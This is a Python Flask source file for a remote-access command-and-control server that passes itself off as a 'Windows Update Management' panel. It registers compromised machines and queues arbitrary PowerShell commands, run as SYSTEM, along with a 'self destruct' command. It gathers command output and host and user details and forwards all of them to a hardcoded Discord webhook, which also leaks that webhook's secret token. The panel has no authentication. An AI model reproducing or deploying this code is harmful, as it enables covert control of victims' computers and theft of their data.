from flask import Flask, request, jsonify
import threading
import time
import json
import os
import hashlib
import base64
from datetime import datetime
import requests
import glob

app = Flask(__name__)

# Configurazione
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
CURRENT_VERSION = "5.1-final"

# Settings logging
MAX_LOG_FILES = 100
LOG_RETENTION_HOURS = 72

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.device_to_client = {}
        self.commands_queue = {}
        self.lock = threading.Lock()
        self.client_counter = 1000
    
    def get_or_create_client(self, device_id, client_data):
        with self.lock:
            if device_id in self.device_to_client:
                client_id = self.device_to_client[device_id]
                
                if client_id in self.clients:
                    self.clients[client_id].update(client_data)
                    self.clients[client_id]["last_seen"] = datetime.now()
                else:
                    self.clients[client_id] = {
                        **client_data,
                        "last_seen": datetime.now(),
                        "device_id": device_id
                    }
                
                return client_id
            
            else:
                client_id = f"C{self.client_counter}"
                self.client_counter += 1
                
                self.clients[client_id] = {
                    **client_data,
                    "first_seen": datetime.now(),
                    "last_seen": datetime.now(),
                    "device_id": device_id
                }
                
                self.device_to_client[device_id] = client_id
                
                send_to_discord(
                    f"🆕 **Nuovo Client** `{client_id}`\n"
                    f"**Host:** {client_data.get('hostname', 'Unknown')}\n"
                    f"**User:** {client_data.get('username', 'Unknown')}"
                )
                
                return client_id
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                device_id = self.clients[client_id].get('device_id')
                if device_id in self.device_to_client:
                    del self.device_to_client[device_id]
                del self.clients[client_id]
            
            if client_id in self.commands_queue:
                del self.commands_queue[client_id]
    
    def list_clients(self):
        with self.lock:
            result = {}
            for cid, info in self.clients.items():
                result[cid] = {
                    "hostname": info.get("hostname", "Unknown"),
                    "username": info.get("username", "Unknown"),
                    "os": info.get("os", "Unknown"),
                    "device_id": info.get("device_id", "Unknown"),
                    "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown",
                    "first_seen": info.get("first_seen").isoformat() if info.get("first_seen") else "Unknown"
                }
            return result
    
    def has_command(self, client_id):
        with self.lock:
            return client_id in self.commands_queue and bool(self.commands_queue[client_id])

client_manager = ClientManager()

def send_to_discord(message):
    if not DISCORD_WEBHOOK:
        return
    
    try:
        payload = {"content": f"**[SERVER]** {message[:1500]}"}
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

def format_for_discord(text, max_length=1500):
    """Formatta testo per Discord con split intelligente"""
    if not text or len(str(text)) <= max_length:
        return str(text)
    
    # Se è JSON, prova a renderlo leggibile
    if isinstance(text, str) and (text.startswith('{') or text.startswith('[')):
        try:
            data = json.loads(text)
            formatted = json.dumps(data, indent=2, ensure_ascii=False)
            if len(formatted) > max_length:
                return formatted[:max_length-100] + "\n... (troncato)"
            return formatted
        except:
            pass
    
    # Split per linee se possibile
    lines = str(text).split('\n')
    if len(lines) > 1:
        result = []
        current_length = 0
        for line in lines:
            if current_length + len(line) + 1 > max_length - 100:
                result.append("... (troncato)")
                break
            result.append(line)
            current_length += len(line) + 1
        return '\n'.join(result)
    
    # Troncamento semplice
    return str(text)[:max_length-100] + "\n... (troncato)"

def save_result(data):
    """Salva risultato con directory creation"""
    try:
        os.makedirs("results", exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        client_id = data.get('client_id', 'unknown')
        filename = f"results/result_{client_id}_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        cleanup_old_files()
        
        return filename
        
    except Exception as e:
        send_to_discord(f"❌ Errore salvataggio: {str(e)[:200]}")
        return None

def cleanup_old_files():
    try:
        cutoff = time.time() - (LOG_RETENTION_HOURS * 3600)
        
        results_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime)
        
        for f in results_files:
            if os.path.getmtime(f) < cutoff:
                try:
                    os.remove(f)
                except:
                    pass
        
        if len(results_files) > MAX_LOG_FILES:
            for f in results_files[:-MAX_LOG_FILES]:
                try:
                    os.remove(f)
                except:
                    pass
                    
    except Exception as e:
        print(f"Cleanup error: {e}")

# ============================================
# 🏠 PAGINE WEB CON FIX
# ============================================

@app.route('/')
def home():
    os.makedirs("results", exist_ok=True)
    clients = client_manager.list_clients()
    
    return f"""
    <html>
    <head><title>Windows Update Management v{CURRENT_VERSION}</title>
    <style>
        body {{ font-family: Arial; margin: 20px; }}
        .card {{ background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }}
        .stats {{ display: flex; gap: 20px; }}
        .stat {{ background: white; padding: 15px; border-radius: 8px; flex: 1; text-align: center; }}
        a {{ color: #007bff; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
    </style>
    </head>
    <body>
        <h1>🖥️ Windows Update Management v{CURRENT_VERSION}</h1>
        
        <div class="card">
            <div class="stats">
                <div class="stat"><h3>👥 Client Attivi</h3><p style="font-size: 24px; font-weight: bold;">{len(clients)}</p></div>
                <div class="stat"><h3>📊 File Log</h3><p style="font-size: 24px; font-weight: bold;">{len(glob.glob('results/*.json'))}</p></div>
            </div>
            
            <div style="margin-top: 20px;">
                <p><a href="/admin" style="background: #007bff; color: white; padding: 10px 20px; border-radius: 5px; display: inline-block;">📋 Pannello Admin</a></p>
                <p><a href="/logs" style="background: #28a745; color: white; padding: 10px 20px; border-radius: 5px; display: inline-block;">📄 Visualizza Log</a></p>
            </div>
        </div>
    </body>
    </html>
    """

@app.route('/logs')
def view_logs():
    """Pagina log con fix directory vuota"""
    try:
        os.makedirs("results", exist_ok=True)
        log_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime, reverse=True)
        
        files_list = ""
        for i, log_file in enumerate(log_files[:50]):
            filename = os.path.basename(log_file)
            size_kb = os.path.getsize(log_file) / 1024
            mtime = datetime.fromtimestamp(os.path.getmtime(log_file))
            
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                client_id = data.get('client_id', 'N/A')
                command = data.get('command', 'N/A')
            except:
                client_id = "Errore lettura"
                command = "N/A"
            
            files_list += f'''
            <tr>
                <td>{i+1}</td>
                <td><a href="/view_log/{filename}">{filename}</a></td>
                <td>{client_id}</td>
                <td><code>{command[:30]}{'...' if len(command) > 30 else ''}</code></td>
                <td>{mtime.strftime('%Y-%m-%d %H:%M')}</td>
                <td>{size_kb:.1f} KB</td>
            </tr>
            '''
        
        if not files_list:
            files_list = '<tr><td colspan="6" style="text-align: center; padding: 20px; color: #666;">📭 Nessun log disponibile</td></tr>'
        
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Log Client - v{CURRENT_VERSION}</title>
            <style>
                body {{ font-family: Arial; margin: 20px; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                tr:hover {{ background-color: #f5f5f5; }}
                .header {{ background: #343a40; color: white; padding: 20px; border-radius: 8px; }}
                code {{ background: #e8f4fc; padding: 2px 5px; border-radius: 3px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>📄 Log Client</h1>
                <p><a href="/" style="color: #80bdff;">🏠 Home</a> | <a href="/admin" style="color: #80bdff;">📋 Admin Panel</a></p>
            </div>
            
            <h3>Ultimi 50 log:</h3>
            <table>
                <tr><th>#</th><th>File</th><th>Client ID</th><th>Comando</th><th>Data/Ora</th><th>Dimensione</th></tr>
                {files_list}
            </table>
        </body>
        </html>
        '''
        
    except Exception as e:
        return f"<h2>Errore caricamento log: {str(e)}</h2>"

@app.route('/view_log/<log_filename>')
def view_single_log(log_filename):
    """Visualizza singolo log - FIX parametro"""
    try:
        filepath = os.path.join("results", log_filename)
        
        if not os.path.exists(filepath):
            return f"<h2>File non trovato: {log_filename}</h2>"
        
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        formatted_json = json.dumps(data, indent=2, ensure_ascii=False)
        
        client_id = data.get('client_id', 'N/A')
        command = data.get('command', 'N/A')
        timestamp = data.get('timestamp', time.time())
        dt = datetime.fromtimestamp(timestamp)
        
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Log: {log_filename}</title>
            <style>
                body {{ font-family: Arial; margin: 20px; }}
                pre {{ background: #f5f5f5; padding: 15px; border-radius: 5px; overflow: auto; max-height: 80vh; }}
                .info {{ background: #e8f4fc; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
                a {{ color: #007bff; text-decoration: none; }}
            </style>
        </head>
        <body>
            <h1>📄 Log: {log_filename}</h1>
            
            <div class="info">
                <p><strong>Client ID:</strong> {client_id}</p>
                <p><strong>Comando:</strong> <code>{command}</code></p>
                <p><strong>Data/Ora:</strong> {dt.strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><strong>Dimensione:</strong> {os.path.getsize(filepath) / 1024:.1f} KB</p>
                <p><a href="/logs">⬅ Torna alla lista log</a> | <a href="/admin">📋 Admin Panel</a></p>
            </div>
            
            <h3>Contenuto JSON:</h3>
            <pre>{formatted_json}</pre>
        </body>
        </html>
        '''
        
    except Exception as e:
        return f"<h2>Errore lettura file: {str(e)}</h2>"

@app.route('/admin')
def admin_panel():
    clients = client_manager.list_clients()
    
    clients_options = ""
    for client_id, info in clients.items():
        display = f"{client_id} - {info['hostname']} ({info['username']})"
        clients_options += f'<option value="{client_id}">{display}</option>'
    
    clients_rows = ""
    for client_id, info in clients.items():
        last_seen = info['last_seen'][11:19] if 'T' in info['last_seen'] else info['last_seen']
        first_seen = info.get('first_seen', 'N/A')
        if 'T' in str(first_seen):
            first_seen = str(first_seen).split('T')[0]
        
        clients_rows += f"""
        <tr>
            <td>{client_id}</td>
            <td>{info['hostname']}</td>
            <td>{info['username']}</td>
            <td>{info['os']}</td>
            <td>{first_seen}</td>
            <td>{last_seen}</td>
            <td>
                <form action="/api/send_command" method="post" style="display: inline;">
                    <input type="hidden" name="client_id" value="{client_id}">
                    <input type="hidden" name="command" value="get_info">
                    <input type="hidden" name="target_user" value="SYSTEM">
                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #17a2b8; color: white; border: none; border-radius: 3px; cursor: pointer;">Info</button>
                </form>
                <form action="/api/send_command" method="post" style="display: inline;">
                    <input type="hidden" name="client_id" value="{client_id}">
                    <input type="hidden" name="command" value="self_destruct">
                    <input type="hidden" name="target_user" value="SYSTEM">
                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer;">💣</button>
                </form>
            </td>
        </tr>
        """
    
    if not clients_rows:
        clients_rows = '<tr><td colspan="7">Nessun client connesso</td></tr>'
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel - v{CURRENT_VERSION}</title>
        <style>
            body {{ font-family: Arial; margin: 20px; }}
            .section {{ margin: 20px 0; padding: 20px; border: 1px solid #dee2e6; border-radius: 8px; }}
            button {{ padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }}
            button:hover {{ background: #0056b3; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ border: 1px solid #dee2e6; padding: 10px; }}
            th {{ background: #f8f9fa; }}
            input, select, textarea {{ width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ced4da; border-radius: 4px; }}
            .nav {{ margin-bottom: 20px; }}
            .nav a {{ margin-right: 15px; color: #007bff; text-decoration: none; }}
        </style>
    </head>
    <body>
        <div class="nav">
            <a href="/">🏠 Home</a>
            <a href="/logs">📄 Log</a>
            <strong>📋 Admin Panel</strong>
        </div>
        
        <h2>Windows Update Management Panel</h2>
        
        <div class="section">
            <h3>📋 Comandi</h3>
            <form action="/api/send_command" method="post">
                <label>Client:</label><br>
                <select name="client_id">{clients_options}</select><br><br>
                <input type="hidden" name="target_user" value="SYSTEM">
                <label>Comando:</label><br>
                <select name="command">
                    <option value="systeminfo">System Information</option>
                    <option value="list_files">List Files</option>
                    <option value="active_users">Active Users</option>
                    <option value="get_info">Client Info</option>
                    <option value="self_destruct">💣 Self Destruct</option>
                </select><br><br>
                <button type="submit">Invia Comando</button>
            </form>
        </div>
        
        <div class="section">
            <h3>⚡ PowerShell Live</h3>
            <form action="/api/send_powershell" method="post">
                <label>Client:</label><br>
                <select name="client_id">{clients_options}</select><br><br>
                <input type="hidden" name="target_user" value="SYSTEM">
                <label>Comando PowerShell:</label><br>
                <textarea name="command" rows="3" placeholder="Get-Process | Select -First 5"></textarea><br><br>
                <button type="submit">Esegui PowerShell</button>
            </form>
        </div>
        
        <div class="section">
            <h3>📊 Client Attivi ({len(clients)})</h3>
            <table>
                <tr><th>ID</th><th>Hostname</th><th>User</th><th>OS</th><th>Prima connessione</th><th>Ultimo visto</th><th>Azioni</th></tr>
                {clients_rows}
            </table>
        </div>
    </body>
    </html>
    '''

# ============================================
# 🔄 API ENDPOINTS
# ============================================

@app.route('/api/register', methods=['POST'])
def register_client():
    try:
        data = request.json
        if not data or 'device_id' not in data:
            return jsonify({"status": "error", "message": "device_id required"}), 400
        
        device_id = data['device_id']
        client_id = client_manager.get_or_create_client(device_id, data)
        
        return jsonify({"status": "success", "client_id": client_id})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/heartbeat', methods=['GET'])
def heartbeat():
    try:
        client_id = request.args.get('client_id')
        device_id = request.args.get('device_id')
        
        if not client_id or not device_id:
            return jsonify({"status": "error", "message": "Missing params"}), 400
        
        with client_manager.lock:
            if client_id not in client_manager.clients:
                return jsonify({"status": "reregister", "message": "Client not found"}), 404
        
        if client_manager.has_command(client_id):
            return jsonify({"status": "command_available", "message": "Command waiting"})
        else:
            with client_manager.lock:
                if client_id in client_manager.clients:
                    client_manager.clients[client_id]["last_seen"] = datetime.now()
            
            return jsonify({"status": "ok", "message": "Heartbeat received"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get_command', methods=['GET'])
def get_command():
    try:
        client_id = request.args.get('client_id')
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"}), 400
        
        command = client_manager.get_command(client_id)
        
        if command:
            send_to_discord(f"📤 Invio comando a `{client_id}`: `{command[:100]}`")
            return jsonify({"status": "success", "command": command})
        else:
            return jsonify({"status": "no_command", "message": "No commands"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/results', methods=['POST'])
def receive_results():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        client_id = data.get('client_id')
        command = data.get('command', 'unknown')
        results = data.get('results', {})
        
        filename = save_result(data)
        
        # Formatta per Discord
        result_str = ""
        if isinstance(results, dict):
            if 'stdout' in results:
                result_str = format_for_discord(results.get('stdout', ''))
            elif 'hostname' in results:
                result_str = f"Hostname: {results.get('hostname')}\nUser: {results.get('username')}\nOS: {results.get('os')}"
            else:
                result_str = format_for_discord(str(results))
        else:
            result_str = format_for_discord(str(results))
        
        discord_msg = f"📊 **Risultati da** `{client_id}`\n"
        discord_msg += f"**Comando:** `{command}`\n"
        discord_msg += f"```\n{result_str}\n```"
        
        send_to_discord(discord_msg)
        
        return jsonify({"status": "success", "message": "Results received"})
        
    except Exception as e:
        send_to_discord(f"❌ Errore ricezione risultati: {str(e)[:200]}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    try:
        client_id = request.form.get('client_id')
        command = request.form.get('command')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not client_id or not command:
            return "Errore: parametri mancanti", 400
        
        final_command = command
        if target_user != "SYSTEM":
            final_command = f"user_{target_user}:{command}"
        
        client_manager.add_command(client_id, final_command)
        
        send_to_discord(f"🌐 Comando `{command}` inviato a `{client_id}`")
        
        return f'''
        <h3>✅ Comando Inviato!</h3>
        <p><strong>Client:</strong> <code>{client_id}</code></p>
        <p><strong>Comando:</strong> <code>{command}</code></p>
        <p><a href="/admin">↶ Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/send_powershell', methods=['POST'])
def send_powershell():
    try:
        client_id = request.form.get('client_id')
        ps_command = request.form.get('command')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not client_id or not ps_command:
            return "Errore: parametri mancanti", 400
        
        final_command = f"powershell_live:{ps_command}"
        if target_user != "SYSTEM":
            final_command = f"user_{target_user}:powershell_live:{ps_command}"
        
        client_manager.add_command(client_id, final_command)
        
        send_to_discord(f"⚡ PowerShell inviato a `{client_id}`")
        
        return f'''
        <h3>✅ PowerShell Inviato!</h3>
        <p><strong>Client:</strong> <code>{client_id}</code></p>
        <p><a href="/admin">↶ Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return f"Errore: {str(e)}", 500

@app.route('/api/clients', methods=['GET'])
def list_clients_api():
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "count": len(clients),
        "clients": clients,
        "server_version": CURRENT_VERSION
    })

# ============================================
# 🏁 AVVIO SERVER
# ============================================
if __name__ == '__main__':
    os.makedirs("results", exist_ok=True)
    os.makedirs("uploads", exist_ok=True)
    
    def cleanup_loop():
        while True:
            time.sleep(3600)
            try:
                cleanup_old_files()
            except:
                pass
    
    threading.Thread(target=cleanup_loop, daemon=True).start()
    
    send_to_discord(f"🚀 **Server v{CURRENT_VERSION} avviato**")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
